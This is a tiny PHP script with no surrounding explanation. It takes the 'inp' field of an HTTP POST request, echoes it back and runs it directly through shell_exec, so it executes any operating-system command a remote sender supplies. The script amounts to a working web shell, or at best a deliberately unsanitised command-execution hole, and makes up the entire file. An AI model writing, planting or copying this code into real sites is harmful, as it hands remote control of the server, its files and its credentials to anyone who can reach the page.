<?php
$command = $_POST['inp'];

echo $command, '<br/>';
echo shell_exec($command);
?>

